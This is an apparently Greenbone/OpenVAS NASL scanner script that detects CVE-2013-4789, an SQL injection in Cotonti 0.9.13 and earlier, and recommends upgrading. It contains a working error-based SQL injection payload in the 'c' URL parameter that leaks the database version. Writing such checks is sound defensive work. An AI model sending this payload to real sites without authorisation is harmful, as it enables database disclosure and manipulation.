if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803848" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2013-4789" );
	script_bugtraq_id( 61538 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-08-05 17:34:41 +0530 (Mon, 05 Aug 2013)" );
	script_name( "Cotonti 'c' Parameter SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is running Cotonti and is prone to SQL Injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted sql query via HTTP GET request and check whether it is able to
  get the mysql version or not." );
	script_tag( name: "solution", value: "Upgrade to version 0.9.14 or higher." );
	script_tag( name: "insight", value: "Input passed via the 'c' parameter to index.php (when 'e' is set to
  'rss') is not properly sanitised before being used in a SQL query." );
	script_tag( name: "affected", value: "Cotonti version 0.9.13 and prior" );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to inject or manipulate SQL
  queries in the back-end database, allowing for the manipulation or disclosure
  of arbitrary data." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/54289" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Aug/1" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/27287" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23164" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122639/cotonti0913-sql.txt" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/php/cotonti-0913-sql-injection-vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.cotonti.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/cotonti", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(ContainsString( rcvRes, "Cotonti<" ) && ContainsString( rcvRes, ">Stay tuned" )){
		url = dir + "/index.php?e=rss&c='and(select%201%20from(select%20count(*)" + ",concat((select%20concat(version())),floor(rand(0)*2))x%20f" + "rom%20information_schema.tables%20group%20by%20x)a)and'";
		if(http_vuln_check( port: port, url: url, pattern: "SQL error 23000: .*Duplicate entry.*group_key", extra_check: make_list( "Fatal error",
			 "database.php" ) )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

